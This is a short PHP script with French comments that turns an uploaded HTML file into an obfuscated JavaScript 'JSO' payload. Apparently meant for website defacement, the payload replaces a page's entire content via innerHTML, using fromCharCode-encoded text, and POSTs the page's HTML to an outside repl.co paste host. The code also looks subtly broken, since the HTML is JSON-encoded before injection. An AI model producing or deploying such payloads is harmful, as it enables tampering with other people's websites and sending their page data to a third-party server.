<?php
if (isset($_FILES['html-file'])) {
    // On ouvre le fichier HTML uploadé
    $html_file = file_get_contents($_FILES['html-file']['tmp_name']);

    // On convertit le fichier HTML en JSO
    $jso = json_encode($html_file);

    // On ajoute le code nécessaire pour envoyer le JSO à l'API
    $jso = 'document.documentElement.innerHTML=String.fromCharCode(' . implode(',', unpack('C*', $jso)) . ');';
    $jso .= 'const xhr=new XMLHttpRequest();';
    $jso .= 'xhr.open("POST","https://hastebytrhacknon.trhacknon.repl.co/documents",true);';
    $jso .= 'xhr.setRequestHeader("Content-Type","application/json;charset=UTF-8");';
    $jso .= 'xhr.send(JSON.stringify({"data":document.documentElement.innerHTML}));';

    // On renvoie le résultat en tant que réponse JSO
    header('Content-Type: application/json');
    echo json_encode(['jso' => $jso]);
}
